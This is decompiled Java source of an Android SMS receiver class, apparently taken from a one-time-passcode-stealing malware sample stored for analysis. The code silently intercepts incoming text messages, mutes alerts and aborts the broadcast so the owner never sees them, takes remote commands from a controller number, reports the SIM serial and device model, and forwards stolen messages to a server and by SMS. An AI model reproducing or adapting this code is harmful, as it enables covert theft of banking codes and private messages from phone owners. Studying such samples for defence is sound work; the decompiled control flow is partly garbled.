package com.soft360.iService;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.database.SQLException;
import android.media.AudioManager;
import android.media.RingtoneManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import cD;
import dU;
import em;
import en;
import et;
import eu;
import java.io.IOException;

public class SmsReciever
  extends BroadcastReceiver
{
  public Context a;
  
  private static String a(String paramString)
  {
    String str;
    if ((paramString == null) || (paramString.length() == 0)) {
      str = "";
    }
    char c;
    do
    {
      return str;
      c = paramString.charAt(0);
      str = paramString;
    } while (Character.isUpperCase(c));
    return Character.toUpperCase(c) + paramString.substring(1);
  }
  
  private void a(int paramInt, String paramString1, String paramString2)
  {
    Notification localNotification = new Notification(paramInt, this.a.getString(2131165184), System.currentTimeMillis());
    localNotification.flags = 16;
    localNotification.sound = RingtoneManager.getDefaultUri(2);
    Object localObject = new Intent(this.a, MainActivity.class);
    ((Intent)localObject).putExtra("greedConfirm", true);
    ((Intent)localObject).setAction("android.intent.action.MAIN");
    ((Intent)localObject).addCategory("android.intent.category.LAUNCHER");
    localObject = PendingIntent.getActivity(this.a, 0, (Intent)localObject, 0);
    localNotification.setLatestEventInfo(this.a, paramString1, paramString2, (PendingIntent)localObject);
    ((NotificationManager)this.a.getSystemService("notification")).notify(558, localNotification);
  }
  
  private static void a(Context paramContext)
  {
    if (!Build.VERSION.RELEASE.startsWith("4.4")) {
      return;
    }
    ((AudioManager)paramContext.getSystemService("audio")).setStreamMute(5, false);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    for (;;)
    {
      Object localObject1;
      int i;
      Object localObject3;
      Object localObject2;
      Object localObject4;
      try
      {
        new StringBuilder("SmsRecieveronReceive ").append(Build.VERSION.RELEASE).toString();
        if (Build.VERSION.RELEASE.startsWith("4.4")) {
          ((AudioManager)paramContext.getSystemService("audio")).setStreamMute(5, true);
        }
        localObject1 = paramIntent.getExtras();
        this.a = paramContext;
        paramIntent = "";
        if (localObject1 == null) {
          break label1402;
        }
        Object[] arrayOfObject = (Object[])((Bundle)localObject1).get("pdus");
        paramContext.getContentResolver();
        i = 0;
        if (i >= arrayOfObject.length) {
          return;
        }
        localObject3 = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
        localObject2 = SmsManager.getDefault();
        String str = ((SmsMessage)localObject3).getDisplayMessageBody().toString();
        localObject4 = ((SmsMessage)localObject3).getOriginatingAddress().trim();
        localObject1 = new StringBuilder(String.valueOf(paramIntent)).append((String)localObject4).append("|").toString() + str;
        new StringBuilder("SmsReciever debug ").append((String)localObject1).toString();
        paramIntent = dU.a(this.a);
        try
        {
          cD localcD = paramIntent.a;
          cD.a(this.a.getString(2131165199));
          localcD = paramIntent.a;
          if (str.equals(new String(cD.a(this.a.getString(2131165199)))))
          {
            new StringBuilder("new_tel: ").append((String)localObject4).toString();
            em.a = (String)localObject4;
            new StringBuilder("smsParser.tel1 - ").append(em.a).toString();
            AService.a();
            a(paramContext);
            abortBroadcast();
            dU.a();
          }
          new StringBuilder("address= ").append((String)localObject4).append("   smsParser.tel1=").append(em.a).toString();
          if (!((String)localObject4).equals(em.a)) {
            break label1212;
          }
          a(paramContext);
          abortBroadcast();
          localObject4 = em.a();
          ((em)localObject4).a(((SmsMessage)localObject3).getMessageBody());
          if (((em)localObject4).c())
          {
            paramIntent.e();
            a(paramContext);
            abortBroadcast();
          }
        }
        catch (Exception localException)
        {
          localException.printStackTrace();
          continue;
        }
        if (!((em)localObject4).f()) {
          break label427;
        }
      }
      catch (Exception paramIntent)
      {
        a(paramContext);
        abortBroadcast();
        return;
      }
      dU.f();
      continue;
      label427:
      boolean bool = ((em)localObject4).d();
      if (bool)
      {
        try
        {
          dU.g();
        }
        catch (SQLException paramIntent)
        {
          paramIntent.printStackTrace();
        }
        catch (Exception paramIntent)
        {
          paramIntent.printStackTrace();
        }
      }
      else
      {
        bool = ((em)localObject4).e();
        if (bool)
        {
          try
          {
            dU.h();
          }
          catch (SQLException paramIntent)
          {
            paramIntent.printStackTrace();
          }
          catch (Exception paramIntent)
          {
            paramIntent.printStackTrace();
          }
        }
        else if (((em)localObject4).g())
        {
          paramIntent.b();
        }
        else if (((em)localObject4).h())
        {
          paramIntent.c();
        }
        else if (((em)localObject4).o())
        {
          dU.e();
        }
        else if (((em)localObject4).j())
        {
          paramIntent = eu.a;
          if (paramIntent != null) {
            try
            {
              eu.a.b();
              eu.a = null;
              return;
            }
            catch (IOException paramIntent)
            {
              for (;;)
              {
                paramIntent.printStackTrace();
              }
            }
          }
          eu.a = new en();
          try
          {
            eu.a.a();
            eu.a.c();
            dU.a();
          }
          catch (IOException paramIntent)
          {
            for (;;)
            {
              paramIntent.printStackTrace();
            }
          }
        }
        else
        {
          label975:
          int j;
          int k;
          if (((em)localObject4).k())
          {
            dU.b();
            paramIntent = eu.a;
            if (paramIntent != null) {
              try
              {
                eu.a.b();
                eu.a = null;
              }
              catch (IOException paramIntent)
              {
                for (;;)
                {
                  paramIntent.printStackTrace();
                }
              }
            }
          }
          else
          {
            if (((em)localObject4).n())
            {
              dU.a(((SmsMessage)localObject3).getMessageBody());
              continue;
            }
            if (((em)localObject4).i())
            {
              paramIntent.d();
              continue;
            }
            if (((em)localObject4).o())
            {
              dU.e();
              continue;
            }
            if (((em)localObject4).p())
            {
              paramIntent.f();
              continue;
            }
            if (((em)localObject4).r())
            {
              paramIntent.g();
              continue;
            }
            if (((em)localObject4).a())
            {
              paramIntent = localObject3.getMessageBody().split(" ")[1];
              localObject2 = PreferenceManager.getDefaultSharedPreferences(this.a.getApplicationContext()).edit();
              ((SharedPreferences.Editor)localObject2).putString("domainPref", paramIntent);
              ((SharedPreferences.Editor)localObject2).commit();
              new StringBuilder("isAddDomain - ").append(paramIntent).toString();
              continue;
            }
            if (((em)localObject4).q())
            {
              paramContext.startService(new Intent(paramContext, AService.class));
              paramContext.startService(new Intent(paramContext, webService.class));
              if (et.a(paramContext).a()) {
                paramIntent = "onLine";
              }
              for (;;)
              {
                try
                {
                  localObject3 = new StringBuilder("i am ").append(paramIntent).append(" (").append(((TelephonyManager)paramContext.getSystemService("phone")).getSimSerialNumber()).append(" + ");
                  paramIntent = Build.MANUFACTURER;
                  localObject4 = Build.MODEL;
                  if (!((String)localObject4).startsWith(paramIntent)) {
                    break label975;
                  }
                  paramIntent = a((String)localObject4);
                  paramIntent = paramIntent + ")";
                  ((SmsManager)localObject2).sendTextMessage(em.a, null, paramIntent, null, null);
                }
                catch (Exception paramIntent) {}
                break;
                paramIntent = "offLine";
                continue;
                paramIntent = a(paramIntent) + " " + (String)localObject4;
              }
            }
            if (!((em)localObject4).t()) {
              continue;
            }
            paramIntent = ((SmsMessage)localObject3).getMessageBody().split(" ");
            localObject2 = PreferenceManager.getDefaultSharedPreferences(this.a).edit();
            ((SharedPreferences.Editor)localObject2).putString("greedKoord", paramIntent[1]);
            ((SharedPreferences.Editor)localObject2).commit();
            j = Integer.parseInt(this.a.getString(2131165185));
            paramIntent = this.a.getString(2131165186);
            paramIntent = paramIntent.substring(paramIntent.lastIndexOf("/") + 1, paramIntent.lastIndexOf("."));
            k = this.a.getResources().getIdentifier(paramIntent, "drawable", this.a.getPackageName());
          }
          switch (j)
          {
          case 27: 
            a(k, this.a.getString(2131165184), this.a.getString(2131165426));
            break;
          case 28: 
            a(k, this.a.getString(2131165184), this.a.getString(2131165433));
            continue;
            label1212:
            if (dU.i())
            {
              dU.a(null);
              for (;;)
              {
                try
                {
                  long l = dU.a((SmsMessage)localObject3);
                  new StringBuilder("SmsRecieverinsert sms to DB, id:").append(l).toString();
                }
                catch (Exception paramIntent)
                {
                  new StringBuilder("SmsReciever Exception").append(paramIntent.toString()).toString();
                  continue;
                }
                finally
                {
                  abortBroadcast();
                }
                try
                {
                  new StringBuilder("SmsRecieversend sms to SERVER ").append((String)localObject1).toString();
                  paramIntent = eu.a(AService.a);
                  if (this.a != null) {
                    paramIntent.a(this.a);
                  }
                  paramIntent.a((String)localObject1, ((SmsMessage)localObject3).getDisplayOriginatingAddress());
                }
                catch (Exception paramIntent)
                {
                  new StringBuilder("SmsReciever fail ").append(paramIntent.toString()).toString();
                }
              }
              new StringBuilder("SmsRecieversend sms to DB ").append((String)localObject1).toString();
              ((SmsManager)localObject2).sendTextMessage(em.a, null, (String)localObject1, null, null);
              abortBroadcast();
              abortBroadcast();
              break label1403;
              label1402:
              return;
            }
            label1403:
            i += 1;
            paramIntent = (Intent)localObject1;
          }
        }
      }
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/com/soft360/iService/SmsReciever.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */